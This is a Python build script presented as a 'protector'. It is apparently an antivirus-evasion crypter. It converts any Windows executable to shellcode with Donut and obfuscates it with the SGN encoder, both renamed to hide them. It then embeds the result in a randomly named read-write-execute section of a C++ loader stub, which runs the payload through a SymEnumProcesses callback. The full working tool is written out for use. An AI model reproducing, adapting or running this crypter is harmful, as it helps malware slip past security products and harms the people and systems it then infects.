import subprocess
import os
import sys
import argparse
import tempfile
import time
import threading
import random
import string
import shutil
import math
from colorama import init, Fore, Style

init(autoreset=True)

# --- Configuration ---
UD = "./Utils/"
DDP = os.path.join(UD, "E2S.X")
DSP = os.path.join(UD, "SGN.X")
DCP = "cl.exe"

DA = "-z 4" # Donut args
SAT = '-i "{ib}" -o "{ob}"' # SGN args
CAT = '/nologo /O1 /GL /Gy /GS- /MT /EHsc /W3 /D "WIN32" /D "NDEBUG" /DEBUG:NONE /Fe:"{oe}" "{ic}" /link /LTCG /OPT:REF /OPT:ICF /INCREMENTAL:NO /SUBSYSTEM:WINDOWS kernel32.lib user32.lib Dbghelp.lib'

# --- Console Output Helpers ---
def pi(m): print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {m}")
def ps(m): print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {m}")
def pw(m): print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {m}")
def pe(m): print(f"{Fore.RED}[-]{Style.RESET_ALL} {m}")

# --- Spinner ---
sse = threading.Event()
st = None
def sf():
    cs = ['|','/','-','\\']
    i = 0
    while not sse.is_set():
        sys.stdout.write(f"\r{Fore.YELLOW}{Style.BRIGHT}{cs[i % 4]}{Style.RESET_ALL} Processing...")
        sys.stdout.flush()
        i += 1; time.sleep(0.1)
    # Explicitly clear line on stop
    sys.stdout.write('\r' + ' ' * (len(" Processing...") + 2) + '\r')
    sys.stdout.flush()

def ss():
    global st
    if st and st.is_alive(): return
    sse.clear()
    st = threading.Thread(target=sf, daemon=True)
    st.start()

def stsp():
    global st
    if st and st.is_alive():
        sse.set()
        st.join(timeout=0.5)
    sys.stdout.write('\r' + ' ' * (len(" Processing...") + 2) + '\r')
    sys.stdout.flush()
    st = None

# --- Helper Functions ---
def rcmd(cmd, sh=True, sout=False, serr=False):
    """Runs a command, optionally suppressing output, raising error on failure."""
    stdout_dest = subprocess.DEVNULL if sout else None
    stderr_dest = subprocess.DEVNULL if serr else None
    try:
        stsp()
        subprocess.run(cmd, shell=sh, check=True, stdout=stdout_dest, stderr=stderr_dest)
    except subprocess.CalledProcessError as e:
        stsp()
        pe(f"External command failed: {cmd.split()[0] if isinstance(cmd, str) else cmd[0]}")
        raise
    except FileNotFoundError as e:
        stsp()
        pe(f"Required tool not found: {cmd.split()[0] if isinstance(cmd, str) else cmd[0]}")
        pe(f"Error details: {e}")
        raise

def rtp(target, default, name):
    """Resolves tool path: checks target, default, PATH env var. (Less verbose)"""
    abs_target = os.path.abspath(target) if target else None
    abs_default = os.path.abspath(default)

    if abs_target and os.path.isfile(abs_target): return abs_target
    if os.path.isfile(abs_default): return abs_default

    search_name = os.path.basename(target if target else default)
    for pd in os.environ.get("PATH","").split(os.pathsep):
        for ex in ("", ".exe", ".bat", ".cmd"):
            pp = os.path.join(pd, search_name + ex)
            if os.path.isfile(pp) and os.access(pp, os.X_OK): return pp

    final_target = target if target else default
    pw(f"{name} ('{final_target}') resolution failed; relying on shell PATH.")
    return final_target

def cce():
    """Checks for necessary Visual Studio environment variables. (Less verbose)"""
    missing = [v for v in ("INCLUDE", "LIB", "LIBPATH") if not os.environ.get(v)]
    if missing:
        pe(f"Build environment error: Missing {', '.join(missing)}")
        pw("Ensure script runs within a configured Developer Command Prompt.")
        return False
    return True

def format_size(size_bytes):
    """Formats bytes into a human-readable string (KB, MB, etc.)."""
    if size_bytes == 0: return "0 B"
    size_name = ("B", "KB", "MB", "GB", "TB")
    try:
        i = int(math.floor(math.log(size_bytes, 1024)))
        if i >= len(size_name): i = len(size_name) - 1
        p = math.pow(1024, i)
        s = round(size_bytes / p, 2)
        return f"{s} {size_name[i]}"
    except (ValueError, OverflowError):
         return f"{size_bytes} B"

# --- Main Logic ---
def main():
    p = argparse.ArgumentParser(
        description="TRIPROT Protector: Embeds payload via Donut/SGN into a C++ stub with randomized RWX section.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    p.add_argument("-i","--input",    required=True, help="Input executable (.exe) to protect.")
    p.add_argument("-o","--output",   required=True, help="Output path for the protected executable (.exe).")
    p.add_argument("--donut",         default=DDP,   help="Path to Donut executable (E2S.X).")
    p.add_argument("--sgn",           default=DSP,   help="Path to SGN executable (SGN.X).")
    p.add_argument("--compiler",      default=DCP,   help="Path to C++ compiler (cl.exe).")
    p.add_argument("--keep-temp",     action="store_true", help="Keep temporary files and directory after execution.")
    args = p.parse_args()

    # --- Initial Output & Checks ---
    stsp()
    print("-" * 60)
    pi(f"{Fore.WHITE}{Style.BRIGHT}TRIPROT Protector Initializing...{Style.RESET_ALL}")
    print("-" * 60)

    if not cce():
        sys.exit(1)

    # --- Path Resolution & Setup ---
    original_size = 0
    try:
        iea = os.path.abspath(args.input)
        oea = os.path.abspath(args.output)
        if not os.path.isfile(iea):
            pe(f"Input file validation failed: '{args.input}' not found.")
            sys.exit(1)
        original_size = os.path.getsize(iea)

        odir = os.path.dirname(oea)
        if odir: os.makedirs(odir, exist_ok=True)

        compiler = rtp(args.compiler, DCP, "Compiler (cl.exe)")
        donut    = rtp(args.donut,    DDP,   "Donut")
        sgn      = rtp(args.sgn,      DSP,   "SGN")
    except Exception as e:
        pe(f"Setup error: {e}")
        sys.exit(1)

    td = None
    try:
        # --- Temp Directory ---
        td = tempfile.mkdtemp(prefix="TriProt_")
        bpath = os.path.join(td, "payload.bin")
        encpath = os.path.join(td, "payload.enc")
        stubcpp = os.path.join(td, "stub.cpp")
        stubobj = os.path.join(td, "stub.obj")

        # --- Step 1: Donut ---
        pi("Stage 1: Transforming input PE to position-independent shellcode...")
        ss() # Start spinner for the command
        try:
            cmd = f'"{donut}" -i "{iea}" -o "{bpath}" {DA}'
            rcmd(cmd, sout=True, serr=True)
        except Exception as e:
            pe("Shellcode generation failed (Donut).")
            sys.exit(1)
        finally:
            stsp() # Stop spinner

        if not os.path.exists(bpath) or os.path.getsize(bpath) == 0:
            pe("Shellcode file missing or empty after Donut.")
            sys.exit(1)

        # --- Step 2: SGN ---
        pi("Stage 2: Applying SGN encoding/obfuscation layer...")
        ss() # Start spinner for the command
        try:
            cmd = f'"{sgn}" {SAT.format(ib=bpath, ob=encpath)}'
            rcmd(cmd, sout=True, serr=True)
        except Exception as e:
            pe("Payload encoding failed (SGN).")
            sys.exit(1)
        finally:
            stsp() # Stop spinner

        if not os.path.exists(encpath) or os.path.getsize(encpath) == 0:
            pe("Encoded payload file missing or empty after SGN.")
            sys.exit(1)

        # --- Step 3: Generate C++ stub ---
        pi("Stage 3: Constructing executable loader stub...")
        sec_name = "." + "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 8)))
        # Print informational messages *without* the spinner active
        pi(f"   - Defining randomized executable section: {Fore.MAGENTA}{sec_name}{Style.RESET_ALL}")

        hex_vals = ""
        payload_size_str = "0 B"
        try:
            # Use spinner only for the file reading part
            ss()
            with open(encpath, "rb") as f:
                data = f.read()
            stsp() # Stop after reading

            payload_size_str = format_size(len(data))
            hex_vals = ", ".join(f"0x{b:02x}" for b in data)
            if not hex_vals:
                hex_vals = "0"
                pw("Warning: Encoded payload data is empty.")

        except OSError as e:
            stsp() # Ensure spinner is stopped on error
            pe(f"Failed to read encoded payload '{encpath}': {e}")
            sys.exit(1)

        # Print the embedding message now that data is read and spinner stopped
        pi(f"   - Embedding {Style.BRIGHT}{payload_size_str}{Style.RESET_ALL} of encoded payload into section...")


        stub_code = f"""
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <DbgHelp.h>

#pragma comment(linker, "/SECTION:{sec_name},ERW")
#pragma section("{sec_name}", execute, read, write)

__declspec(allocate("{sec_name}"))
const unsigned char g_payload[] = {{ {hex_vals} }};

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {{
    BOOL success = FALSE;
    HANDLE hProc = GetCurrentProcess();
    if (SymInitialize(hProc, NULL, FALSE)) {{
        SymEnumProcesses((PSYM_ENUMPROCESSES_CALLBACK)(void*)g_payload, NULL);
        SymCleanup(hProc);
        success = TRUE;
    }}
    return success ? 0 : 1;
}}
"""
        try:
            # Use spinner only for writing the stub file
            ss()
            with open(stubcpp, "w", encoding="utf-8") as f:
                f.write(stub_code)
            stsp() # Stop after writing
        except OSError as e:
            stsp() # Ensure spinner is stopped on error
            pe(f"Failed to write C++ stub file '{stubcpp}': {e}")
            sys.exit(1)

        # --- Step 4: Compile stub.cpp ---
        pi(f"Stage 4: Compiling stub with Link-Time Code Generation (LTCG)...")
        ss() # Start spinner
        try:
            compile_cmd = f'"{compiler}" /Fo"{stubobj}" {CAT.format(oe=oea, ic=stubcpp)}'
            rcmd(compile_cmd, sout=True, serr=True) # Redirect output
        except Exception as e:
            pe(f"Stub compilation failed. Review build environment and compiler flags.")
            sys.exit(1)
        finally:
            stsp() # Stop spinner

        final_size = 0
        if not os.path.exists(oea) or os.path.getsize(oea) == 0:
            pe("Compilation resulted in missing or empty output executable.")
            sys.exit(1)
        else:
             final_size = os.path.getsize(oea)

        # --- Final Summary ---
        stsp()
        print("-" * 60)
        ps(f"{Fore.GREEN}{Style.BRIGHT}Protection Applied Successfully!{Style.RESET_ALL}")
        print(f" {Fore.CYAN}{Style.BRIGHT}Input File:{Style.RESET_ALL}  {iea}")
        print(f" {Fore.CYAN}{Style.BRIGHT}Output File:{Style.RESET_ALL} {oea}")
        print("-" * 60)
        print(f" {Fore.YELLOW}Original Size:{Style.RESET_ALL} {format_size(original_size)}")
        print(f" {Fore.YELLOW}Final Size:   {Style.RESET_ALL} {format_size(final_size)}")
        size_diff = final_size - original_size
        diff_sign = "+" if size_diff >= 0 else "-"
        print(f" {Fore.YELLOW}Size Change:{Style.RESET_ALL}  {diff_sign}{format_size(abs(size_diff))}")
        print("-" * 60)

    except Exception as e:
        stsp()
        pe(f"An critical error occurred during processing: {e}")
        sys.exit(1)

    finally:
        # --- Cleanup ---
        stsp()
        if td and os.path.isdir(td):
            if not args.keep_temp:
                try:
                    shutil.rmtree(td)
                except OSError as e:
                    pw(f"Cleanup warning: Could not remove temp directory {td}: {e}")
            else:
                pi(f"Temporary build artifacts retained at: {td}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stsp()
        pw("\nOperation cancelled by user.")
        sys.exit(1)
    except SystemExit as e:
        stsp()
        if e.code != 0:
             print(f"{Fore.RED}Exiting with status code {e.code}{Style.RESET_ALL}")
        sys.exit(e.code)
    except Exception as e:
        stsp() # Stop spinner on uncaught exception
        pe(f"Unhandled exception caught at top level: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(99)
    finally:
        stsp()
